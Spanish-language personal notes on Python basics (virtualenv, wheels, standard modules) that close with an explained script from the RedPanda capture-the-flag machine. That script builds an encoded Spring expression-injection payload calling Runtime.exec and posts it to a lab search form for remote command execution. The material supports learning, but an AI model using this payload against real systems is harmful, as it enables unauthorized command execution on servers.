# Basic sintaxis 

<h2> Input Data </h2>

```python 
# Taking input from the user
name = input("Enter your name")

# Output
print("Hello", name)


```

```python 
# Taking input from the user
name = input("Enter your name")

# Output
print("Hello", name)

# prints the string by removing geeks
print(string.strip(' geeks'))

```

```
<h2> Regular Expr</h2> 
<h3> Lookahead and Lookbehind</h3>
<ol>
<li>bar(?=bar)     finds the 1st bar ("bar" which has "bar" after it)           </li>
<li> bar(?!bar)     finds the 2nd bar ("bar" which does not have "bar" after it)</li>
<li> (?<=foo)bar    finds the 1st bar ("bar" which has "foo" before it)            </li> 
  
#(?<!foo)bar    finds the 2nd bar ("bar" which does not have "foo" before it) 
  
</ol>

```
# python -m venv 

Es un  modulo que tiene python integrado compite con virtualenv para evitar problemas usaremos el anterior hay mas documentacion.

# virtualenv para crear entornos virutales y separar librerias

Instalar el virtualenv

```
sudo apt install virtualenv -y 

```

Crear un entorno virtual

```
virtualenv mi_env 

```

Primero se usa ese comando lo cual crea una capeta con algunos archivos que se usan para generar el entorno virtual

Activar el virtualenv:

```
source mi_env/bin/activate
```


Esto activa el entorno virtual y permite que todas las dependencias se instalen aisladas. Cuando se activa el entorno se mira algo asi:

```
(mi_env)─(kali㉿kali)-[~]
pip install django

```

Desactivar el entorno se hace asi 

```
deactivate
```


# Que son las wheels y como se usan

>Las ruedas son un componente del ecosistema de Python que ayuda a que las instalaciones de paquetes funcionen . Permiten instalaciones más rápidas y más estabilidad en el proceso de distribución de paquetes. En este tutorial, se sumergirá en lo que son las ruedas, para qué sirven y cómo han ganado tracción y han hecho que Python sea aún más agradable para trabajar.


## Para expermimentar con las wheels 

Usa estos paquetes de python

```
python -m pip install -U pip wheel setuptools
```
## Palabras clave

### PyPA

> The Python Packaging Authority (PyPA) is a working group that maintains a core set of software projects used in Python packaging.
The software developed through the PyPA is used to package, share, and install Python software and to interact with indexes of downloadable Python software such as PyPI, the Python Package Index. Click the logo below to download pip, the most prominent software used to interact with PyPI.

### CPython

Cuando escribe pythonen la consola o instala una distribución de Python desde python.org , está ejecutando CPython . CPython es uno de los muchos tiempos de ejecución de Python, mantenido y escrito por diferentes equipos de desarrolladores. Algunos otros tiempos de ejecución que puede haber escuchado son PyPy , Cython y Jython .


### wheel vs sdist

Wheel propociona todo se baja del repositorio PyPi ya compilado mientras sdist tienes que compilar todo y es mas dificil que se instale.

>La instalación desde ruedas evita directamente el paso intermedio de construir paquetes a partir de la distribución de origen


### Que pasa cuando haces pip

> TAR file (tarball) named uwsgi-2.0.18.tar.gz that’s been compressed with gzip.

1. Cuando se usa pip se descarga un archivo tar.gz el cual se le llama ***tarball***
2. Se genera un archivo .whl
>On line 6, it takes the tarball and builds a .whl file through a call to setup.py
3. En la línea 7 , etiqueta la rueda uWSGI-2.0.18-cp38-cp38-macosx_10_15_x86_64.whl.
4.  instala el paquete real después de haber construido la rueda.

Todo lo anterior en un caso ideal que se instale bien python es aberrante y cambia todo el tiempo revislo


## sdist (distribuciones de origen)

> El tar.gztarball que piprecupera es una distribución de origen , o sdist, en lugar de una rueda. De alguna manera, a sdistes lo opuesto a una rueda.
> Una distribución fuente contiene código fuente. Eso incluye no solo el código de Python, sino también el código fuente de cualquier módulo de extensión (generalmente en C o C++ ) incluido con el paquete. Con las distribuciones de código fuente, los módulos de extensión se compilan del lado del usuario en lugar del desarrollador.

Osea que un *** source distribution*** traes todo el codigo fuente incluso archivos que son e c o c++ y se supone se compila de lado del cliente cuanod lo descargas vaya.

## PyPI

> El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python. Los desarrolladores de Python pretenden que sea un catálogo exhaustivo de todos los paquetes de Python escritos en código abierto1​

# Importante 

> Las ruedas eliminaron setup.pyla ejecución de la ecuación. La instalación desde una distribución de origen ejecuta lo que esté contenido en el archivo setup.py. Como señaló PEP 427 , esto equivale a la ejecución de código arbitrario. Las ruedas evitan esto por completo.

# .WHL
Un archivo de Python .whl esencialmente un archivo ZIP ( .zip) con un nombre de archivo especialmente diseñado que le dice a los instaladores qué versiones y plataformas de Python admitirá la rueda.

Una rueda es un tipo de distribución construida . En este caso, construido significa que la rueda viene en un formato listo para instalar y le permite omitir la etapa de construcción requerida con las distribuciones de origen.

vale la pena mencionar que, a pesar del uso del término construido , una rueda no contiene .pycarchivos ni un código de bytes de Python compilado.

## Nomenglatura

cada rueda te dice donde se puede instlar la base es esta 

```
{dist}-{version}(-{build})?-{python}-{abi}-{platform}.whl
Ejemplo 
cryptography-2.9.2-cp35-abi3-macosx_10_9_x86_64.whl
```

### Ejemplos

```
cryptography-2.9.2-cp35-abi3-macosx_10_9_x86_64.whl

```
1. ***cryptography:*** es el nombre del paquete.

2. ***2.9.2:*** es la versión del paquete de cryptography. Una versión es una cadena compatible con PEP 440 , como 2.9.2, 3.4o 3.9.0.a3.

3. ***cp35es:*** la etiqueta de Python y denota la implementación y la versión de Python que exige la rueda. El cpsignifica CPython , la implementación de referencia de Python, mientras que el 35denota Python 3.5 . Esta rueda no sería compatible con Jython , por ejemplo.

4. ***abi3es:*** la etiqueta ABI. ABI significa interfaz binaria de aplicación . Realmente no necesita preocuparse por lo que implica, pero abi3es una versión separada para la compatibilidad binaria de la API de Python C.

5 ***macosx_10_9_x86_64*** Es la etiqueta de la plataforma, que resulta ser bastante complicada. En este caso, se puede dividir aún más en subpartes:

macosxes el sistema operativo macOS .
10_9es la versión del SDK de las herramientas de desarrollo de macOS que se utiliza para compilar Python que, a su vez, creó esta rueda.
x86_64es una referencia a la arquitectura del conjunto de instrucciones x86-64.
El componente final no es técnicamente una etiqueta, sino la .whlextensión de archivo estándar. Combinados, los componentes anteriores indican la máquina de destino para la que cryptographyestá diseñada esta rueda.

### Ejemplo 2

```
chardet-3.0.4-py2.py3-none-any.whl
```

Puedes dividir esto en sus etiquetas:

1. ***chardetes: *** el nombre del paquete.
2 ***3.0.4es: *** la versión de paquete de chardet.
3. ***py2.py3es: *** la etiqueta de Python, lo que significa que la rueda es compatible con Python 2 y 3 con cualquier implementación de Python.
4. ****none: *** es la etiqueta ABI, lo que significa que ABI no es un factor.
5. ***any: ***es la plataforma. Esta rueda funcionará en prácticamente cualquier plataforma.
6. El ***py2.py3-none-any.whl*** segmento del nombre de la rueda es común. Esta es una rueda universal que se instalará con Python 2 o 3 en cualquier plataforma con cualquier ABI . Si la rueda termina en none-any.whl, es muy probable que se trate de un paquete de Python puro al que no le importa una ABI de Python o una arquitectura de CPU específicas.


## Descargar solo .whl

```
python -m pip download --only-binary :all: --dest . --no-cache six
```

1. --only-binary: all: tells pip to constrain itself to using wheels and ignore source distributions. Without this option, pip will only prefer wheels but will fall back to source distributions in some scenarios.
2. --dest: . tells pip to download six to the current directory.
3. --no-cache: tells pip not to look in its local download cache. You use this option just to illustrate a live download from PyPI since it’s likely you do have a six cache somewhere.

Referencias 

> https://realpython.com/python-wheels/
> 
## Python Anywhere 

Puedes correr scripts de python 24/7 para trabajos automatizados.



## Uso de la consola de pyhton

Si necesitas ayuda sobre una clase por ejemplo la de ""dnspython" lo que se puede hacer es lo sigiuente

```
python3 
import dns.zone as dz
para ver que metodos se puedne utilizar 
help(dz. Tab # auto completa todo y te muestra que podemos utilizar 

```
![image](https://user-images.githubusercontent.com/63270579/209983814-f4cf67bc-7811-49d7-a94c-9b74f9381c27.png)


## Pensamiento para tratar con funciones desconocidas

Por ejemplo tenemos esto:

```
from_xfr(xfr, zone_factory=<class 'dns.zone.Zone'>, relativize=True, check_origin=True)
```
Si te das cuenta hay valores con igual esos son por defecto pero el primero al parecer ese si es afuerzas entonces tendrias que ver que es

![image](https://user-images.githubusercontent.com/63270579/209988709-e18ae2c4-1bcf-4258-82b3-74ae2adaa52e.png)


Necesitamos un objeto 

```
import dns.query as dq
# axfr = dz.from_xfr(dq.xfr())

```

Y pues ni modo no sabemos que hace de nuevo nos ayudamos del help


```
 help(dq.xfr) 
 ```
 
 
 
 


# Script explicado RedPanda 

## Import os

> The OS module in Python provides functions for interacting with the operating system. OS comes under Python’s standard utility modules. This module provides a portable way of using operating system-dependent functionality. The *os* and *os.path* modules include many functions to interact with the file system

```
os.name
#output 
posix
```
### Ejemplo desde dentro del script ( no se te olvide escapar las dobles comillas para que no las interprete literal )

```
os.system("cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/ <h2 class="searched">You searched for: //' | sed 's/ <\/h2>//'"
```

## Import requests

> allows you to send HTTP/1.1 requests extremely easily. There’s no need to manually add query strings to your URLs, or to form-encode your POST data. Keep-alive and HTTP connection pooling are 100% automatic, thanks to urllib3.


# Import sys 

> The sys module in Python provides various functions and variables that are used to manipulate different parts of the Python runtime environment. It allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter. Let’s consider the below example.


Un ejemplo de esto es la manipulacion de argumentos que se le pasan al script ejemplo:

```
./script.py Hello Python agr3 masa
#out 
['./script.py', 'Hello', 'Python', 'agr3', 'masa']

sys.argv[0] == ‘script.py’ 
sys.argv[1] == ‘Hello’ 
sys.argv[2] == ‘Python

```

## Import  pdb — The Python Debugger

> The module pdb defines an interactive source code debugger for Python programs. It supports setting (conditional) breakpoints and single stepping at the source line level, inspection of stack frames, source code listing, and evaluation of arbitrary Python code in the context of any stack frame. It also supports post-mortem debugging and can be called under program control.

### Break point

```
pdb.set_trace()
```
te aparece un prompt ahi puedes poner por el nombre de la variable por ejemplo en el caso del script pues "command" ademas si pones la "l" te pone en que linea.

![image](https://user-images.githubusercontent.com/63270579/207769257-945472c3-9b7a-4b1c-8e51-e7ac5a5aa7b9.png)


## SIGNAL in Linux

> A signal is an event generated by the UNIX and Linux systems in response to some condition. Upon receipt of a signal, a process may take action. A signal is just like an interrupt; when it is generated at the user level, a call is made to the kernel of the OS, which then acts accordingly.

```
man signals

```

![image](https://user-images.githubusercontent.com/63270579/207737677-f2118d2d-944c-4561-9bcb-cfae917124a4.png)


## Import signal

> Este módulo proporciona mecanismos para usar gestores de señales en Python.

> La función signal.signal() permite definir gestores personalizados que serán ejecutados cuando una señal es recibida. Un pequeño número de gestores por defecto son instalados: SIGPIPE es ignorada (por lo que los errores de escritura en tuberías y sockets se pueden informar como excepciones ordinarias de Python) y SIGINT es trasladada en una excepción KeyboardInterrupt si el proceso padre no lo ha cambiado.

```

def def_handler(sig, frame):
	print("\n\n [!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

```


## Import time

> This module provides various time-related functions. For related functionality, see also the datetime and calendar modules.

Por ejemplo se puede usar sleep:

```
#!/usr/bin/python3 

import requests,sys,pdb,signal,os, time 


def def_handler(sig, frame):
	print("\n\n [!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	time.sleep(10)

```


## Python ord()

> The ord() function returns an integer representing the Unicode character.

```
print(ord('@'))   
64
>>> print(ord('A'))                    
65   

```

## Import requests

Sirve para hacer peticiones tanto post como get y otras supongo en este caso aqui tienen un ejemplo de una peticion post:

```
search_url="http://10.10.11.170:8080/search"
	post_data = {
		'name':payload # mira como tienen comillas para evitar que interprete una variable
	}
	r = requests.post(search_url, data=post_data)
```

## Chrome ver peticiones 

Para ver las peticiones sin que tengas que usar el burpsuite ( muy util ) pestaña network oprimes el boton genera una peticion la selecciona y te vas a request para ver que datos manda en este caso el campo name

![image](https://user-images.githubusercontent.com/63270579/208353699-b009464d-5c7f-4c5c-a158-399f7a94dd75.png)


## Opening Files in Python

> Python has a built-in open() function to open a file. This function returns a file object, also called a handle, as it is used to read or modify the file accordingly.

### Para archivos existentes

```

>>> f = open("test.txt")    # open file in current directory
>>> f = open("C:/Python38/README.txt")  # specifying full path

```

#### Para crear un nuevo archivo


```
	f = open("output.txt", "w")
	f.write(r.text)
	f.close()
```




> https://www.programiz.com/python-programming/file-operation

## AWK Rango

Tenemos que filtrar el output del programa el comando id el cual es el siguiente:

```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Red Panda Search | Made with Spring Boot</title>
    <link rel="stylesheet" href="css/search.css">
  </head>
  <body>
    <form action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
  </form>
    <div class="wrapper">
  <div class="results">
    <h2 class="searched">You searched for: uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
</h2>
      <h2>There are 0 results for your search</h2>
       
    </div>
    </div>
    
  </body>
</html>

```

Se usa un rango con awk '/desde/,/hasta nota como escapaste la diagolal de la tag h2 para que no entrara en conflicto/':

```
cat output.txt | awk '/searched/,/<\/h2>/'

```
Se usa sed para borrar o "sustituir" sed 's/lo que quieres sustuir/por lo que se va a sustituir/'

```
cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/ <h2 class="searched">You searched for: //' | sed 's/ <\/h2>//'
```

## Script Completo

```
#!/usr/bin/python3 

import requests,sys,pdb,signal,os, time 


def def_handler(sig, frame):
	print("\n\n [!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
	print("\n[!] El programa ha sido ejecutado incorrectamente\n")


def makePayload():
	command = sys.argv[1]
	payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % ord(command[0])
	command = command[1:] # osea quitas el caracter 0 es como rebuscado
	
	for character in command:
		payload += ".concat(T(java.lang.Character).toString(%s))" % ord(character)
	payload += ").getInputStream())}"	
	return payload


def makeRequest(payload):
	search_url="http://10.10.11.170:8080/search"
	post_data = {
		'name':payload
	}
	r = requests.post(search_url, data=post_data)
	#print(r.text)
	f = open("output.txt", "w")
	f.write(r.text)
	f.close()
	os.system("cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/ <h2 class=\"searched\">You searched for: //' | sed 's/<\/h2>//'")
	os.remove("output.txt")

if __name__ == '__main__':
	payload = makePayload()
	makeRequest(payload)
	
```	

## Importaciones


Revisa esta pagina es el mejor recurso para entender que es un modulo.


> https://www.datacamp.com/tutorial/modules-in-python#rdl

